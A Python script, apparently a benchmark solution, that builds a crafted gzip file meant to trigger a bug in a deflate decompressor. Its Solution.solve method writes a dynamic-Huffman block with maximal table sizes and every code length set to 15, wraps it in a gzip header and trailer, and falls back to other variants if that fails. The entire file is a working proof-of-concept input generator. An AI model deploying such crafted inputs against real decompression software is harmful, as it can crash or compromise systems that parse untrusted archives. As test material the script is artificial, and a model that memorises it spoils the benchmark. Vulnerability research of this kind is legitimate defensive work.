import struct
import zlib
import gzip


def bit_reverse(x: int, bits: int) -> int:
    r = 0
    for _ in range(bits):
        r = (r << 1) | (x & 1)
        x >>= 1
    return r


def build_huffman_codes(lengths):
    if not lengths:
        return []
    max_bits = max(lengths)
    if max_bits == 0:
        return [0] * len(lengths)
    bl_count = [0] * (max_bits + 1)
    for l in lengths:
        if l > 0:
            bl_count[l] += 1
    next_code = [0] * (max_bits + 1)
    code = 0
    for bits in range(1, max_bits + 1):
        code = (code + bl_count[bits - 1]) << 1
        next_code[bits] = code
    codes = [0] * len(lengths)
    for n, length in enumerate(lengths):
        if length != 0:
            codes[n] = next_code[length]
            next_code[length] += 1
    return codes


class BitWriter:
    def __init__(self):
        self.bytes = bytearray()
        self.bitbuf = 0
        self.bitcnt = 0

    def write_bits(self, value: int, nbits: int):
        v = value
        for _ in range(nbits):
            bit = v & 1
            v >>= 1
            self.bitbuf |= bit << self.bitcnt
            self.bitcnt += 1
            if self.bitcnt == 8:
                self.bytes.append(self.bitbuf & 0xFF)
                self.bitbuf = 0
                self.bitcnt = 0

    def finish(self) -> bytes:
        if self.bitcnt != 0:
            self.bytes.append(self.bitbuf & 0xFF)
            self.bitbuf = 0
            self.bitcnt = 0
        return bytes(self.bytes)


def build_deflate_block(reverse_codes: bool) -> bytes:
    bw = BitWriter()

    # Final block, dynamic Huffman
    bw.write_bits(1, 1)  # BFINAL = 1
    bw.write_bits(2, 2)  # BTYPE = 2 (dynamic)

    # Maximal tree sizes to stress the implementation
    HLIT = 29   # 257 + 29 = 286 literal/length codes
    HDIST = 31  # 1 + 31 = 32 distance codes
    HCLEN = 15  # 4 + 15 = 19 code-length codes

    bw.write_bits(HLIT, 5)
    bw.write_bits(HDIST, 5)
    bw.write_bits(HCLEN, 4)

    # Code-length alphabet lengths: 19 symbols, all length 5
    num_cl_symbols = 19
    cl_lengths = [5] * num_cl_symbols
    code_length_order = [16, 17, 18, 0, 8, 7, 9, 6,
                         10, 5, 11, 4, 12, 3, 13, 2,
                         14, 1, 15]

    # Write code-length code lengths in given order (3 bits each)
    for sym in code_length_order:
        bw.write_bits(cl_lengths[sym], 3)

    # Build Huffman codes for code-length alphabet
    cl_codes = build_huffman_codes(cl_lengths)

    def write_cl_symbol(sym: int):
        code = cl_codes[sym]
        length = cl_lengths[sym]
        if reverse_codes:
            code = bit_reverse(code, length)
        bw.write_bits(code, length)

    total_ll = HLIT + 257   # 286 literal/length codes
    total_dist = HDIST + 1  # 32 distance codes
    total_codes = total_ll + total_dist  # 318 codes total

    # Set every literal/length and distance code length to 15
    # by emitting symbol 15 repeatedly in the code-length stream.
    for _ in range(total_codes):
        write_cl_symbol(15)

    # Literal/length and distance Huffman trees: all lengths 15
    ll_lengths = [15] * total_ll
    dist_lengths = [15] * total_dist

    ll_codes = build_huffman_codes(ll_lengths)
    _ = build_huffman_codes(dist_lengths)  # distances not used in data

    def write_ll_symbol(sym: int):
        code = ll_codes[sym]
        length = ll_lengths[sym]
        if reverse_codes:
            code = bit_reverse(code, length)
        bw.write_bits(code, length)

    # Data: just an end-of-block symbol (256), no actual literals
    write_ll_symbol(256)

    return bw.finish()


def build_gzip_variant(reverse_codes: bool):
    try:
        block = build_deflate_block(reverse_codes)
    except Exception:
        return None
    try:
        # Verify deflate block is valid and get uncompressed data
        decompressed = zlib.decompress(block, -15)
    except Exception:
        return None

    crc32 = zlib.crc32(decompressed) & 0xFFFFFFFF
    isize = len(decompressed) & 0xFFFFFFFF

    # Simple gzip header
    header = bytes([
        0x1F, 0x8B,       # ID1, ID2
        0x08,             # CM = deflate
        0x00,             # FLG
        0x00, 0x00, 0x00, 0x00,  # MTIME
        0x00,             # XFL
        0xFF              # OS = unknown
    ])

    trailer = struct.pack('<II', crc32, isize)
    gzip_data = header + block + trailer

    # Validate full gzip stream
    try:
        z_out = zlib.decompress(gzip_data, 16 + zlib.MAX_WBITS)
    except Exception:
        return None

    # Sanity: z_out should match original decompressed data
    if z_out != decompressed:
        return None

    return gzip_data


class Solution:
    def solve(self, src_path: str) -> bytes:
        # First try with standard bit-reversed Huffman codes
        data = build_gzip_variant(True)
        if data is not None:
            return data

        # Fallback: try without bit reversal (very unlikely needed)
        data = build_gzip_variant(False)
        if data is not None:
            return data

        # Last-resort fallback: a simple valid gzip (may not trigger the bug)
        return gzip.compress(b"fallback")
